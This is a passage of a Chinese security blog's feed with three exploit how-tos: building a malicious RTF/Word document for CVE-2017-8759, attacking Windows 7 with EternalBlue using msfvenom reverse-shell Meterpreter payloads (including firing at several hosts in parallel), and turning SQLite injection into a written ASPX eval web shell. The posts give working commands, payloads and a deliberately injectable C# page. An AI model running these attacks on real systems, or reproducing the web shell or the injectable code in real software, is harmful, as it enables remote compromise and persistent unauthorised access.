class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后放在web目录。<br>根据样本文件，发现是在word文档中添加一个SOAP标记。<br>格式为<code>soap:wsdl=http://192.168.135.135/office/office.png</code><br>本次以样本为例，然后修改其中的地址。<br><img src="%E6%A0%B7%E6%9C%AC%E6%96%87%E4%BB%B6.jpg" alt="样本文件"></p><p>分别用样本和自己的web地址生成特hex格式的地址，然后将样本中的地址更换为自己的地址即可。（注意替换的长度需保持一致）</p><p><img src="%E7%94%9F%E6%88%90hex%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%9C%B0%E5%9D%80.jpg" alt="生成hex格式的地址"></p><p>样本文件最重要的是倒数第三行（看起来是空白），然后可以将上面无用的内容全部删除，只留下最后三行。</p><p><img src="%E6%9B%BF%E6%8D%A2%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9.jpg" alt="替换地址后的内容"></p><p>然后就是打开该word文档，就可以看到计算器弹出。但实现的过程有点问题，就是必须点更新链接才会触发（即使将添加objupdate还是不行）。</p><p><img src="%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C.gif" alt="执行效果"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>参考<a href="https://github.com/vysec/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/vysec/CVE-2017-8759</a><br>新建o.png，内容为：</p><p><img src="o.png%E5%86%85%E5%AE%B9.jpg" alt="o.png内容"></p><p>word.db内容：<br><img src="word.db%E5%86%85%E5%AE%B9.jpg" alt="word.db内容"></p><p>新建一个rtf文档，随意插入一个对象。例如<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a> (这是为了下面替换objdata内容)<br>用记事本打开，将<code>\object\objautlink\rsltpict</code>修改为<code>\object\objautlink\objupdate\rsltpict</code><br>打开blob.bin文件</p><p><img src="blob.bin%E6%BA%90%E6%96%87%E4%BB%B6.jpg" alt="blob.bin源文件"><br>将其中的地址修改为<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a><br>复制原来的地址，尽量多复制点空格。<br><img src="%E6%9B%BF%E6%8D%A2%E8%BF%87%E7%A8%8B1.jpg" alt="替换过程1"></p><p>然后生成新的hex地址<br><img src="%E7%94%9F%E6%88%90%E6%96%B0%E7%9A%84%E5%9C%B0%E5%9D%80.jpg" alt="生成新的地址"></p><p>然后用生成的地址替换blob.bin中的地址<br><img src="%E6%9B%BF%E6%8D%A2%E5%90%8E%E7%9A%84blob.bin%E6%96%87%E4%BB%B6.jpg" alt="替换后的blob.bin文件"><br>然后将blob.bin中的内容替换word文档的objdata内容。<br>然后打开word文档，就会有神奇的事情发生。<br><img src="%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C2.gif" alt="执行效果2"></p><p>恶意软件将被放置在<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\OfficeUpdte-KB[6个随机数字].exe</code></p><blockquote><p>以上均在虚拟机上测试。没有使用样本中的left.jpg。最后结果确实如火眼所说的那样生成了OfficeUpdte-KB******.exe文件。在win10(真机)上测试的时候还生成了http1001924168413541350office0office4png.pdb、http1001924168413541350office0office4png.dll和Logo.cs三个文件。<br>这里方法一没有直接执行的原因我也不太清楚，但是用方法二插入office.png，也是不会直接执行的。如果方法一和二中过程替换一下，效果也是一样的。</p></blockquote><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>下载脚本<a href="https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py</a></p><p>使用方法：<code>python CVE-2017-8759_exploit_rtf.py http://192.168.135.135/office/office.png</code><br>会在当前目录生成文件cve-2017-8759.rtf，打开即可。</p><blockquote><p>根据CVE-2017-0199的脚本改写而来，仅仅保留并修改了生成文件的代码。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1].<a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a><br>[2].<a href="http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA</a><br>[3].<a href="https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;FireEye&lt;/a&gt;最近检测到一个恶意的Microsoft Office RTF文档，利用&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CVE-2017-8759&lt;/a&gt;（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="CVE-2017-8759" scheme="https://fuping.site/tags/CVE-2017-8759/"/>
    
      <category term=".NET Framework" scheme="https://fuping.site/tags/NET-Framework/"/>
    
  </entry>
  
  <entry>
    <title>使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹</title>
    <link href="https://fuping.site/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/"/>
    <id>https://fuping.site/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/</id>
    <published>2017-08-16T06:54:20.000Z</published>
    <updated>2017-08-17T01:06:50.910Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">Sleepya</a>的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。</p><a id="more"></a><p>靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。<br>脚本下载地址：<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p><h3 id="漏洞利用测试"><a href="#漏洞利用测试" class="headerlink" title="漏洞利用测试"></a>漏洞利用测试</h3><h4 id="1-安装NASM"><a href="#1-安装NASM" class="headerlink" title="1.安装NASM"></a>1.安装NASM</h4><p>下载地址：<a href="http://www.nasm.us/pub/nasm/releasebuilds/" target="_blank" rel="noopener">http://www.nasm.us/pub/nasm/releasebuilds/</a> ，我这里用的是<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.13.01/win64/nasm-2.13.01-installer-x64.exe" target="_blank" rel="noopener">2.13</a>。<br>然后开始安装。</p><p><img src="%E5%AE%89%E8%A3%85NASM.jpg" alt="安装NASM"></p><p>安装完成后加入环境变量。</p><h4 id="2-下载利用脚本，并编译内核shellcode"><a href="#2-下载利用脚本，并编译内核shellcode" class="headerlink" title="2.下载利用脚本，并编译内核shellcode"></a>2.下载利用脚本，并编译内核shellcode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure><p><img src="%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC.jpg" alt="下载脚本"></p><p>编译内核shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> MS17-010/shellcode/</span><br><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br><span class="line">nasm -f bin eternalblue_kshellcode_x86.asm</span><br></pre></td></tr></table></figure><p><img src="%E7%BC%96%E8%AF%91ASM%E6%96%87%E4%BB%B6.jpg" alt="编译ASM文件"></p><h4 id="3-生成反弹exp"><a href="#3-生成反弹exp" class="headerlink" title="3.生成反弹exp"></a>3.生成反弹exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 -f raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 -f raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin</span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9exp.jpg" alt="生成反弹exp"></p><h4 id="4-合并SHELLCODE"><a href="#4-合并SHELLCODE" class="headerlink" title="4.合并SHELLCODE"></a>4.合并SHELLCODE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bin</span><br><span class="line">cat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.bin</span><br><span class="line">python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%90%88%E5%B9%B6SHELLCODE.jpg" alt="合并SHELLCODE"></p><h4 id="5-开启Metasploit并监听"><a href="#5-开启Metasploit并监听" class="headerlink" title="5.开启Metasploit并监听"></a>5.开启Metasploit并监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> EXITFUNC thread</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.217.1</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">...</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4445</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><p><img src="%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.jpg" alt="开启监听"></p><h4 id="6-进行攻击"><a href="#6-进行攻击" class="headerlink" title="6.进行攻击"></a>6.进行攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E7%9A%84%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="利用生成的脚本攻击"></p><p><img src="%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.jpg" alt="攻击结果"><br>看到已经获取Meterpreter反弹。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>在PentestBox中运行一些命令时(如msfconsole)，提示<code>不是内部或外部命令，也不是可运行的程序或批处理文件。</code><br>解决方法：输入<code>cmd</code>之后再输入需要执行的命令。<br><img src="%E9%97%AE%E9%A2%981.jpg" alt="问题1"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。<br>2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。<br>3.在使用中设置了线程，可以同时对多个系统进行攻击测试。<br>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.134 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.135 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.136 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure><p><img src="%E5%A4%9A%E4%B8%AA%E6%94%BB%E5%87%BB.jpg" alt="多个攻击"><br>攻击结果：<br><img src="%E5%A4%9A%E4%B8%AA%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C.jpg" alt="多个攻击结果"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a><br>[2]<a href="https://www.exploit-db.com/docs/42280.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/42280.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用&lt;a href=&quot;https://github.com/worawit/MS17-010&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sleepya
&lt;/a&gt;的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="MS17-010" scheme="https://fuping.site/tags/MS17-010/"/>
    
      <category term="PentestBox" scheme="https://fuping.site/tags/PentestBox/"/>
    
      <category term="Metasploit" scheme="https://fuping.site/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>SQLite手工注入Getshell技巧</title>
    <link href="https://fuping.site/2017/07/19/SQLite-Injection-Get-WebShell/"/>
    <id>https://fuping.site/2017/07/19/SQLite-Injection-Get-WebShell/</id>
    <published>2017-07-19T11:07:30.000Z</published>
    <updated>2017-07-26T02:00:30.932Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p><a href="http://www.sqlite.org/" target="_blank" rel="noopener">SQLite</a>是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。<br>之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。<br>首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。</p><a id="more"></a><h3 id="0x02-SQLite的使用"><a href="#0x02-SQLite的使用" class="headerlink" title="0x02 SQLite的使用"></a>0x02 SQLite的使用</h3><p>SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问  <a href="http://www.sqlite.org/download.html" target="_blank" rel="noopener">SQLite下载页面</a>，从 Windows 区下载预编译的二进制文件。现在最新的为<a href="http://www.sqlite.org/2017/sqlite-tools-win32-x86-3190300.zip" target="_blank" rel="noopener">sqlite-tools-win32-x86-3190300.zip</a>，下载下来后解压。我这里将其中的文件复制到<code>D:\sqlite</code>目录。</p><p>SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。</p><p>创建使用命令：<code>sqlite3.exe 数据库文件名</code>。例如创建一个名字为aa.db的数据库，使用命令：<code>sqlite3.exe aa.db</code>。</p><p><img src="%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="创建数据库"></p><p>附加数据库的基本语法是：<code>ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;</code>。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：<code>attach database &#39;d:\\sqlite\\bb.db&#39; as &#39;a&#39;;</code>。</p><p><img src="%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="附加数据库"></p><p>创建表并插入数据的命令如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a.tt(dataz <span class="built_in">text</span>); <span class="keyword">INSERT</span> <span class="keyword">into</span> a.tt(dataz) <span class="keyword">VALUES</span> (<span class="string">'test'</span>);</span><br></pre></td></tr></table></figure><p><img src="%E5%88%9B%E5%BB%BA%E8%A1%A8%E6%9F%A5%E8%AF%A2.jpg" alt="创建表查询"></p><p>SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：<code>&lt;?php phpinfo();?&gt;</code>。</p><p>具体命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt;ATTACH DATABASE <span class="string">'d:\\sqlite\\23.php'</span> AS <span class="built_in">test</span> ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (<span class="string">'&lt;?php phpinfo();?&gt;'</span>);--</span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%BC%E5%BC%8F%E4%B8%BAPHP.jpg" alt="生成数据库格式为PHP"></p><p>将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。</p><p><img src="PHP%E8%A7%A3%E6%9E%90.jpg" alt="PHP解析"></p><p>同样的方法生成aspx后缀的数据库文件，创建表，并插入<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。</p><p><img src="ASPX%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="ASPX格式数据库"></p><p>通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。</p><h3 id="0x03-本地环境搭建及获取SHELL"><a href="#0x03-本地环境搭建及获取SHELL" class="headerlink" title="0x03 本地环境搭建及获取SHELL"></a>0x03 本地环境搭建及获取SHELL</h3><p>因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。</p><h4 id="1-环境搭建和项目的部署"><a href="#1-环境搭建和项目的部署" class="headerlink" title="1.环境搭建和项目的部署"></a>1.环境搭建和项目的部署</h4><p>下载安装 <a href="https://sourceforge.net/projects/sqlite-dotnet2/" target="_blank" rel="noopener">Sqlite ADO.NET</a>，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。</p><p>这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。</p><p>其目录结构如图：</p><p><img src="%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.jpg" alt="项目目录结构"></p><p>Default.aspx是显示页面，其中有一个文本框和按钮。主要代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:TextBox</span> <span class="attr">ID</span>=<span class="string">"TextBox1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:TextBox</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:Button</span> <span class="attr">ID</span>=<span class="string">"Button1"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">OnClick</span>=<span class="string">"btn_Click"</span> <span class="attr">Text</span>=<span class="string">"查询"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Default.aspx.cs是代码的实现，代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Data.SQLite; </span><br><span class="line"></span><br><span class="line">public partial class _Default : System.Web.UI.Page</span><br><span class="line">&#123;</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!System.IO.File.Exists(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line">            cmd.ExecuteNonQuery();</span><br><span class="line">            <span class="keyword">for</span> (int i = 0; i &lt; 100; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                cmd.CommandText = <span class="string">"insert into Users (UserID,UserName,UserPassword) values ("</span> + i + <span class="string">",'TestUser_"</span> + i + <span class="string">"','"</span> + DateTime.Now.ToString().Replace(<span class="string">" "</span>, <span class="string">"-"</span>).Replace(<span class="string">":"</span>, <span class="string">"-"</span>) + <span class="string">"')"</span>;</span><br><span class="line">                cmd.ExecuteNonQuery();</span><br><span class="line">            &#125;</span><br><span class="line">            conn.Clone();</span><br><span class="line">            conn.Dispose();</span><br><span class="line">            Response.Write(<span class="string">"初始化~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Response.Write(<span class="string">"加载成功~~&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void btn_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextBox1.Text != <span class="string">""</span>)&#123;</span><br><span class="line">            SQLiteConnection.ClearAllPools();</span><br><span class="line">            //SQLiteConnection.CreateFile(Server.MapPath(<span class="string">"~"</span>) + <span class="string">"/UserData.dbx"</span>);</span><br><span class="line">            SQLiteConnection conn = new SQLiteConnection(<span class="string">"Data Source="</span> + Server.MapPath(<span class="string">"~"</span> + <span class="string">"/UserData.dbx"</span>));</span><br><span class="line">            conn.Open();</span><br><span class="line">            SQLiteCommand cmd = new SQLiteCommand();</span><br><span class="line">            cmd.CommandText = <span class="string">"select UserPassword from Users where UserName='"</span> + TextBox1.Text.Trim()+<span class="string">"'"</span>;</span><br><span class="line">            cmd.Connection = conn;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd.ExecuteScalar() != null)</span><br><span class="line">            &#123;</span><br><span class="line">                string tempUserName = cmd.ExecuteScalar().ToString();</span><br><span class="line">                Response.Write(<span class="string">"查询结果为:"</span> + tempUserName + <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Response.Write(<span class="string">"无此用户"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Response.Write(<span class="string">"请输入查询内容~~&lt;br /&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。</p><h4 id="2-SQL注入写WEBSHELL"><a href="#2-SQL注入写WEBSHELL" class="headerlink" title="2.SQL注入写WEBSHELL"></a>2.SQL注入写WEBSHELL</h4><p><img src="%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2.jpg" alt="项目部署"></p><p>当输入<code>&#39;</code>时，项目报错，同时将web绝对路径暴露出来。</p><p><img src="%E6%8A%A5%E9%94%99.jpg" alt="报错"></p><p>然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。</p><p>其语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>c:\\WebSite\\css.aspx<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure><p><img src="%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%86%99shell.jpg" alt="测试环境写shell"></p><p><img src="%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%88%90%E5%8A%9F%E5%86%99%E5%85%A5SHELL.jpg" alt="测试环境成功写入SHELL"></p><p>测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。</p><h3 id="0x04-实际中应用中遇到的问题及解决方法"><a href="#0x04-实际中应用中遇到的问题及解决方法" class="headerlink" title="0x04 实际中应用中遇到的问题及解决方法"></a>0x04 